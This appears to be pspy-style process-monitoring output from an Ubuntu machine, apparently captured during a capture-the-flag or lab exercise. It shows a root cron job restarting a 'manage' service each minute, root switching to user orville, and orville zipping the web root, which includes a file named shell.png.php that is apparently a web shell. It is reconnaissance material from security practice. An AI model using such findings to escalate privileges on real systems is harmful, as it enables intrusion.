+2025/01/16 12:29:07 [34;1mCMD: UID=0     PID=13812  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:07 [34;1mCMD: UID=0     PID=13811  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:07 [34;1mCMD: UID=0     PID=13810  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:07 [34;1mCMD: UID=0     PID=13809  | /lib/systemd/systemd-user-runtime-dir start 0 [0m
+2025/01/16 12:29:08 [34;1mCMD: UID=0     PID=13819  | /sbin/init [0m
+2025/01/16 12:29:08 [34;1mCMD: UID=0     PID=13820  | (sd-pam) [0m
+2025/01/16 12:29:08 [34;1mCMD: UID=0     PID=13821  | (sd-executor) [0m
+2025/01/16 12:29:08 [34;1mCMD: UID=0     PID=13822  | (direxec) [0m
+2025/01/16 12:29:10 [34;1mCMD: UID=0     PID=13824  | (ystemctl) [0m
+2025/01/16 12:29:10 [34;1mCMD: UID=0     PID=13825  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new [0m
+2025/01/16 12:29:10 [34;1mCMD: UID=0     PID=13826  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:29:10 [34;1mCMD: UID=0     PID=13831  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:29:10 [34;1mCMD: UID=0     PID=13855  | cut -d  -f4 [0m
+2025/01/16 12:29:10 [34;1mCMD: UID=0     PID=13854  | /usr/bin/python3 -Es /usr/bin/lsb_release -sd [0m
+2025/01/16 12:29:10 [34;1mCMD: UID=0     PID=13853  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:29:10 [34;1mCMD: UID=0     PID=13852  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:29:12 [34;1mCMD: UID=0     PID=13857  | /bin/sh -e /usr/lib/ubuntu-release-upgrader/release-upgrade-motd [0m
+2025/01/16 12:29:12 [34;1mCMD: UID=0     PID=13858  | [0m
+2025/01/16 12:29:12 [34;1mCMD: UID=0     PID=13862  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:29:12 [34;1mCMD: UID=0     PID=13863  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:29:12 [34;1mCMD: UID=0     PID=13864  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:29:12 [34;1mCMD: UID=0     PID=13865  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:29:12 [34;1mCMD: UID=0     PID=13866  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:29:13 [34;1mCMD: UID=0     PID=13867  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:29:13 [34;1mCMD: UID=0     PID=13868  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:29:13 [34;1mCMD: UID=0     PID=13869  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:29:13 [34;1mCMD: UID=0     PID=13870  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:29:13 [34;1mCMD: UID=0     PID=13871  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:29:13 [34;1mCMD: UID=0     PID=13872  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:29:13 [34;1mCMD: UID=0     PID=13873  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:29:13 [34;1mCMD: UID=0     PID=13874  | find /var/lib/apt/lists/ /etc/apt/sources.list //var/lib/dpkg/status -type f -newer /var/lib/update-notifier/hwe-eol -print -quit [0m
+2025/01/16 12:29:13 [34;1mCMD: UID=0     PID=13875  | id -u [0m
+2025/01/16 12:29:13 [34;1mCMD: UID=0     PID=13877  | [0m
+2025/01/16 12:29:13 [34;1mCMD: UID=0     PID=13876  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:29:14 [34;1mCMD: UID=0     PID=13878  | [0m
+2025/01/16 12:29:14 [34;1mCMD: UID=0     PID=13879  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:29:14 [34;1mCMD: UID=0     PID=13880  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:29:14 [34;1mCMD: UID=0     PID=13881  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:29:14 [34;1mCMD: UID=0     PID=13883  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:29:14 [34;1mCMD: UID=0     PID=13882  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:29:14 [34;1mCMD: UID=0     PID=13885  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:29:14 [34;1mCMD: UID=0     PID=13884  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:29:14 [34;1mCMD: UID=0     PID=13886  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:29:14 [34;1mCMD: UID=0     PID=13891  | /bin/sh /etc/update-motd.d/98-reboot-required [0m
+2025/01/16 12:29:14 [34;1mCMD: UID=0     PID=13896  | -bash [0m
+2025/01/16 12:29:14 [34;1mCMD: UID=0     PID=13895  | [0m
+2025/01/16 12:29:14 [34;1mCMD: UID=0     PID=13892  | -bash [0m
+2025/01/16 12:29:15 [34;1mCMD: UID=0     PID=13897  | -bash [0m
+2025/01/16 12:29:15 [34;1mCMD: UID=0     PID=13898  | /bin/sh /usr/bin/lesspipe [0m
+2025/01/16 12:29:15 [34;1mCMD: UID=0     PID=13900  | dirname /usr/bin/lesspipe [0m
+2025/01/16 12:29:15 [34;1mCMD: UID=0     PID=13899  | /bin/sh /usr/bin/lesspipe [0m
+2025/01/16 12:29:15 [34;1mCMD: UID=0     PID=13901  | dircolors -b [0m
+2025/01/16 12:29:15 [34;1mCMD: UID=0     PID=13902  | -bash [0m
+2025/01/16 12:29:15 [34;1mCMD: UID=0     PID=13903  | su - orville [0m
+2025/01/16 12:29:15 [32;1mCMD: UID=1003  PID=13906  | /usr/bin/locale-check C.UTF-8 [0m
+2025/01/16 12:29:15 [32;1mCMD: UID=1003  PID=13904  | -bash [0m
+2025/01/16 12:29:15 [32;1mCMD: UID=1003  PID=13908  | -bash [0m
+2025/01/16 12:29:15 [32;1mCMD: UID=1003  PID=13907  | -bash [0m
+2025/01/16 12:29:16 [32;1mCMD: UID=1003  PID=13909  | -bash [0m
+2025/01/16 12:29:17 [32;1mCMD: UID=1003  PID=13914  | zip -q -r /home/orville/web_snapshot.zip /var/www/html/css /var/www/html/dashboard.php /var/www/html/includes /var/www/html/index.php /var/www/html/login.php /var/www/html/logout.php /var/www/html/navbar.php /var/www/html/register.php /var/www/html/shell.png.php /var/www/html/uploads [0m
+2025/01/16 12:29:22 [32;1mCMD: UID=1003  PID=13915  | [0m
+2025/01/16 12:29:29 [34;1mCMD: UID=0     PID=13916  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:29 [34;1mCMD: UID=0     PID=13925  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:29 [34;1mCMD: UID=0     PID=13924  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:29 [34;1mCMD: UID=0     PID=13923  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:29 [34;1mCMD: UID=0     PID=13922  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:29 [34;1mCMD: UID=0     PID=13921  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:29 [34;1mCMD: UID=0     PID=13920  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:29 [34;1mCMD: UID=0     PID=13919  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:29 [34;1mCMD: UID=0     PID=13918  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:29 [34;1mCMD: UID=0     PID=13917  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:40 [34;1mCMD: UID=0     PID=13928  | /lib/systemd/systemd-user-runtime-dir stop 0 [0m
+2025/01/16 12:29:40 [34;1mCMD: UID=0     PID=13927  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:40 [34;1mCMD: UID=0     PID=13926  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:40 [34;1mCMD: UID=0     PID=13929  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:40 [34;1mCMD: UID=0     PID=13930  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:40 [34;1mCMD: UID=0     PID=13934  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:40 [34;1mCMD: UID=0     PID=13933  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:40 [34;1mCMD: UID=0     PID=13932  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:40 [34;1mCMD: UID=0     PID=13931  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:41 [34;1mCMD: UID=0     PID=13936  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:41 [34;1mCMD: UID=0     PID=13935  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:01 [34;1mCMD: UID=0     PID=13937  | /usr/sbin/CRON -f [0m
+2025/01/16 12:30:01 [34;1mCMD: UID=0     PID=13939  | systemctl restart manage [0m
+2025/01/16 12:30:01 [34;1mCMD: UID=0     PID=13938  | /bin/sh -c systemctl restart manage [0m
+2025/01/16 12:30:01 [34;1mCMD: UID=0     PID=13940  | /sbin/init [0m
+2025/01/16 12:30:01 [34;1mCMD: UID=0     PID=13941  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:01 [34;1mCMD: UID=0     PID=13942  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:01 [34;1mCMD: UID=0     PID=13948  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:01 [34;1mCMD: UID=0     PID=13947  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:01 [34;1mCMD: UID=0     PID=13946  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:01 [34;1mCMD: UID=0     PID=13945  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:01 [34;1mCMD: UID=0     PID=13944  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:01 [34;1mCMD: UID=0     PID=13943  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:02 [34;1mCMD: UID=0     PID=13949  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:05 [34;1mCMD: UID=0     PID=13950  | [0m
+2025/01/16 12:30:05 [34;1mCMD: UID=0     PID=13954  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:05 [34;1mCMD: UID=0     PID=13953  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:05 [34;1mCMD: UID=0     PID=13952  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:05 [34;1mCMD: UID=109   PID=13957  | sshd: [net]          [0m
+2025/01/16 12:30:05 [34;1mCMD: UID=0     PID=13955  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:06 [34;1mCMD: UID=0     PID=13958  | [0m
+2025/01/16 12:30:06 [34;1mCMD: UID=0     PID=13964  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:06 [34;1mCMD: UID=0     PID=13963  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:06 [34;1mCMD: UID=0     PID=13962  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:06 [34;1mCMD: UID=0     PID=13961  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:06 [34;1mCMD: UID=0     PID=13960  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:06 [34;1mCMD: UID=0     PID=13959  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:07 [34;1mCMD: UID=0     PID=13965  | (systemd) [0m
+2025/01/16 12:30:07 [34;1mCMD: UID=0     PID=13966  | (sd-pam) [0m
+2025/01/16 12:30:07 [34;1mCMD: UID=0     PID=13967  | (sd-executor) [0m
+2025/01/16 12:30:07 [34;1mCMD: UID=0     PID=13968  | (direxec) [0m
+2025/01/16 12:30:08 [34;1mCMD: UID=0     PID=13970  | /lib/systemd/systemd --user [0m
+2025/01/16 12:30:09 [34;1mCMD: UID=0     PID=13973  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:30:09 [34;1mCMD: UID=0     PID=13972  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:30:09 [34;1mCMD: UID=0     PID=13971  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new [0m
+2025/01/16 12:30:09 [34;1mCMD: UID=0     PID=13974  | /bin/sh /etc/update-motd.d/00-header [0m
+2025/01/16 12:30:09 [34;1mCMD: UID=0     PID=13978  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:30:09 [34;1mCMD: UID=0     PID=13979  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:30:09 [34;1mCMD: UID=0     PID=13988  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:30:09 [34;1mCMD: UID=0     PID=13987  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:30:09 [34;1mCMD: UID=0     PID=13986  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:30:09 [34;1mCMD: UID=0     PID=13985  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:30:09 [34;1mCMD: UID=0     PID=13984  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:30:09 [34;1mCMD: UID=0     PID=13993  | /bin/sh /etc/update-motd.d/90-updates-available [0m
+2025/01/16 12:30:09 [34;1mCMD: UID=0     PID=13992  | /bin/sh /etc/update-motd.d/90-updates-available [0m
+2025/01/16 12:30:09 [34;1mCMD: UID=0     PID=13990  | /bin/sh /etc/update-motd.d/90-updates-available [0m
+2025/01/16 12:30:09 [34;1mCMD: UID=0     PID=14001  | cut -d  -f4 [0m
+2025/01/16 12:30:09 [34;1mCMD: UID=0     PID=14000  | /usr/bin/python3 -Es /usr/bin/lsb_release -sd [0m
+2025/01/16 12:30:09 [34;1mCMD: UID=0     PID=13999  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:30:09 [34;1mCMD: UID=0     PID=13998  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:30:10 [34;1mCMD: UID=0     PID=14009  | systemd-detect-virt -q -c [0m
+2025/01/16 12:30:10 [34;1mCMD: UID=0     PID=14008  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:30:11 [34;1mCMD: UID=0     PID=14010  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:30:11 [34;1mCMD: UID=0     PID=14011  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:30:11 [34;1mCMD: UID=0     PID=14012  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:30:11 [34;1mCMD: UID=0     PID=14013  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:30:11 [34;1mCMD: UID=0     PID=14014  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:30:11 [34;1mCMD: UID=0     PID=14015  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:30:11 [34;1mCMD: UID=0     PID=14016  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:30:12 [34;1mCMD: UID=0     PID=14017  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:30:12 [34;1mCMD: UID=0     PID=14018  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:30:12 [34;1mCMD: UID=0     PID=14019  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:30:12 [34;1mCMD: UID=0     PID=14021  | id -u [0m
+2025/01/16 12:30:12 [34;1mCMD: UID=0     PID=14023  | [0m
+2025/01/16 12:30:12 [34;1mCMD: UID=0     PID=14022  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:30:12 [34;1mCMD: UID=0     PID=14024  | [0m
+2025/01/16 12:30:12 [34;1mCMD: UID=0     PID=14034  | awk {print $1} /proc/uptime [0m
+2025/01/16 12:30:12 [34;1mCMD: UID=0     PID=14033  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:30:12 [34;1mCMD: UID=0     PID=14030  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:30:12 [34;1mCMD: UID=0     PID=14035  | [0m
+2025/01/16 12:30:12 [34;1mCMD: UID=0     PID=14038  | sshd: root@pts/2     [0m
+2025/01/16 12:30:12 [34;1mCMD: UID=0     PID=14039  | -bash [0m
+2025/01/16 12:30:12 [34;1mCMD: UID=0     PID=14042  | -bash [0m
+2025/01/16 12:30:12 [34;1mCMD: UID=0     PID=14041  | locale [0m
+2025/01/16 12:30:13 [34;1mCMD: UID=0     PID=14043  | -bash [0m
+2025/01/16 12:30:13 [34;1mCMD: UID=0     PID=14047  | dircolors -b [0m
+2025/01/16 12:30:13 [34;1mCMD: UID=0     PID=14048  | -bash [0m
+2025/01/16 12:30:13 [34;1mCMD: UID=0     PID=14049  | su - orville [0m
+2025/01/16 12:30:13 [32;1mCMD: UID=1003  PID=14050  | -bash [0m
+2025/01/16 12:30:13 [32;1mCMD: UID=1003  PID=14051  | -bash [0m
+2025/01/16 12:30:14 [32;1mCMD: UID=1003  PID=14055  | -bash [0m
+2025/01/16 12:30:14 [32;1mCMD: UID=1003  PID=14059  | dircolors -b [0m
+2025/01/16 12:30:15 [32;1mCMD: UID=1003  PID=14060  | -bash [0m
+2025/01/16 12:30:20 [32;1mCMD: UID=1003  PID=14061  | [0m
+2025/01/16 12:30:27 [34;1mCMD: UID=0     PID=14062  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:28 [34;1mCMD: UID=0     PID=14065  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:28 [34;1mCMD: UID=0     PID=14064  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:28 [34;1mCMD: UID=0     PID=14063  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:28 [34;1mCMD: UID=0     PID=14066  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:28 [34;1mCMD: UID=0     PID=14071  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:28 [34;1mCMD: UID=0     PID=14070  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:28 [34;1mCMD: UID=0     PID=14069  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:28 [34;1mCMD: UID=0     PID=14068  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:28 [34;1mCMD: UID=0     PID=14067  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:38 [34;1mCMD: UID=0     PID=14076  | /sbin/init [0m
+2025/01/16 12:30:38 [34;1mCMD: UID=0     PID=14075  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:38 [34;1mCMD: UID=0     PID=14074  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:38 [34;1mCMD: UID=0     PID=14073  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:38 [34;1mCMD: UID=0     PID=14083  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:38 [34;1mCMD: UID=0     PID=14082  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:38 [34;1mCMD: UID=0     PID=14081  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:38 [34;1mCMD: UID=0     PID=14080  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:38 [34;1mCMD: UID=0     PID=14079  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:38 [34;1mCMD: UID=0     PID=14078  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:30:38 [34;1mCMD: UID=0     PID=14077  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:01 [34;1mCMD: UID=0     PID=14085  | /usr/sbin/CRON -f [0m
+2025/01/16 12:31:01 [34;1mCMD: UID=0     PID=14087  | systemctl restart manage [0m
+2025/01/16 12:31:01 [34;1mCMD: UID=0     PID=14086  | /bin/sh -c systemctl restart manage [0m
+2025/01/16 12:31:01 [34;1mCMD: UID=0     PID=14088  | /sbin/init [0m
+2025/01/16 12:31:01 [34;1mCMD: UID=0     PID=14097  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:01 [34;1mCMD: UID=0     PID=14096  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:01 [34;1mCMD: UID=0     PID=14095  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:01 [34;1mCMD: UID=0     PID=14094  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:01 [34;1mCMD: UID=0     PID=14093  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:01 [34;1mCMD: UID=0     PID=14092  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:01 [34;1mCMD: UID=0     PID=14091  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:01 [34;1mCMD: UID=0     PID=14090  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:01 [34;1mCMD: UID=0     PID=14089  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:02 [34;1mCMD: UID=0     PID=14098  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:05 [34;1mCMD: UID=0     PID=14100  | /usr/sbin/sshd -D -R [0m
+2025/01/16 12:31:05 [34;1mCMD: UID=109   PID=14104  | sshd: [net]          [0m
+2025/01/16 12:31:06 [34;1mCMD: UID=0     PID=14105  | /lib/systemd/systemd-user-runtime-dir start 0 [0m
+2025/01/16 12:31:07 [34;1mCMD: UID=0     PID=14106  | (systemd) [0m
+2025/01/16 12:31:07 [34;1mCMD: UID=0     PID=14107  | (sd-pam) [0m
+2025/01/16 12:31:07 [34;1mCMD: UID=0     PID=14108  | (sd-executor) [0m
+2025/01/16 12:31:07 [34;1mCMD: UID=0     PID=14109  | /usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator [0m
+2025/01/16 12:31:07 [34;1mCMD: UID=0     PID=14110  | (sd-executor) [0m
+2025/01/16 12:31:09 [34;1mCMD: UID=0     PID=14111  | /bin/systemctl --user set-environment DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/0/bus [0m
+2025/01/16 12:31:09 [34;1mCMD: UID=0     PID=14113  | /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:31:09 [34;1mCMD: UID=0     PID=14112  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new [0m
+2025/01/16 12:31:09 [34;1mCMD: UID=0     PID=14114  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:31:09 [34;1mCMD: UID=0     PID=14115  | /bin/sh /etc/update-motd.d/00-header [0m
+2025/01/16 12:31:09 [34;1mCMD: UID=0     PID=14129  | cut -c -80 [0m
+2025/01/16 12:31:09 [34;1mCMD: UID=0     PID=14128  | tr -d \000-\011\013\014\016-\037 [0m
+2025/01/16 12:31:09 [34;1mCMD: UID=0     PID=14127  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:31:09 [34;1mCMD: UID=0     PID=14126  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:31:09 [34;1mCMD: UID=0     PID=14125  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:31:09 [34;1mCMD: UID=0     PID=14134  | grep -q -m 1 . [0m
+2025/01/16 12:31:09 [34;1mCMD: UID=0     PID=14133  | find /var/lib/update-notifier/updates-available -newermt now-7 days [0m
+2025/01/16 12:31:09 [34;1mCMD: UID=0     PID=14131  | /bin/sh /etc/update-motd.d/90-updates-available [0m
+2025/01/16 12:31:10 [34;1mCMD: UID=0     PID=14142  | cut -d  -f4 [0m
+2025/01/16 12:31:10 [34;1mCMD: UID=0     PID=14141  | /usr/bin/python3 -Es /usr/bin/lsb_release -sd [0m
+2025/01/16 12:31:10 [34;1mCMD: UID=0     PID=14140  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:31:10 [34;1mCMD: UID=0     PID=14139  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:31:11 [34;1mCMD: UID=0     PID=14151  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:31:11 [34;1mCMD: UID=0     PID=14149  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:31:11 [34;1mCMD: UID=0     PID=14153  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:31:11 [34;1mCMD: UID=0     PID=14154  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:31:11 [34;1mCMD: UID=0     PID=14155  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:31:11 [34;1mCMD: UID=0     PID=14156  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:31:11 [34;1mCMD: UID=0     PID=14157  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:31:12 [34;1mCMD: UID=0     PID=14160  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:31:12 [34;1mCMD: UID=0     PID=14159  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:31:12 [34;1mCMD: UID=0     PID=14161  | find /var/lib/apt/lists/ /etc/apt/sources.list //var/lib/dpkg/status -type f -newer /var/lib/update-notifier/hwe-eol -print -quit [0m
+2025/01/16 12:31:12 [34;1mCMD: UID=0     PID=14162  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:31:12 [34;1mCMD: UID=0     PID=14163  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:31:12 [34;1mCMD: UID=0     PID=14164  | [0m
+2025/01/16 12:31:12 [34;1mCMD: UID=0     PID=14166  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:31:12 [34;1mCMD: UID=0     PID=14172  | id -u [0m
+2025/01/16 12:31:12 [34;1mCMD: UID=0     PID=14171  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:31:12 [34;1mCMD: UID=0     PID=14173  | [0m
+2025/01/16 12:31:12 [34;1mCMD: UID=0     PID=14175  | awk {print $1} /proc/uptime [0m
+2025/01/16 12:31:12 [34;1mCMD: UID=0     PID=14174  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:31:12 [34;1mCMD: UID=0     PID=14179  | sshd: root@pts/2     [0m
+2025/01/16 12:31:12 [34;1mCMD: UID=0     PID=14180  | -bash [0m
+2025/01/16 12:31:13 [34;1mCMD: UID=0     PID=14183  | -bash [0m
+2025/01/16 12:31:13 [34;1mCMD: UID=0     PID=14182  | locale [0m
+2025/01/16 12:31:13 [34;1mCMD: UID=0     PID=14184  | -bash [0m
+2025/01/16 12:31:13 [34;1mCMD: UID=0     PID=14188  | dircolors -b [0m
+2025/01/16 12:31:13 [34;1mCMD: UID=0     PID=14189  | -bash [0m
+2025/01/16 12:31:13 [34;1mCMD: UID=0     PID=14190  | su - orville [0m
+2025/01/16 12:31:13 [32;1mCMD: UID=1003  PID=14191  | su - orville [0m
+2025/01/16 12:31:13 [32;1mCMD: UID=1003  PID=14195  | -bash [0m
+2025/01/16 12:31:13 [32;1mCMD: UID=1003  PID=14194  | -bash [0m
+2025/01/16 12:31:14 [32;1mCMD: UID=1003  PID=14200  | dircolors -b [0m
+2025/01/16 12:31:15 [32;1mCMD: UID=1003  PID=14201  | zip -q -r /home/orville/web_snapshot.zip /var/www/html/css /var/www/html/dashboard.php /var/www/html/includes /var/www/html/index.php /var/www/html/login.php /var/www/html/logout.php /var/www/html/navbar.php /var/www/html/register.php /var/www/html/shell.png.php /var/www/html/uploads [0m
+2025/01/16 12:31:28 [34;1mCMD: UID=0     PID=14203  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:28 [34;1mCMD: UID=0     PID=14212  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:28 [34;1mCMD: UID=0     PID=14211  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:28 [34;1mCMD: UID=0     PID=14210  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:28 [34;1mCMD: UID=0     PID=14209  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:28 [34;1mCMD: UID=0     PID=14208  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:28 [34;1mCMD: UID=0     PID=14207  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:28 [34;1mCMD: UID=0     PID=14206  | /lib/systemd/systemd-udevd [0m
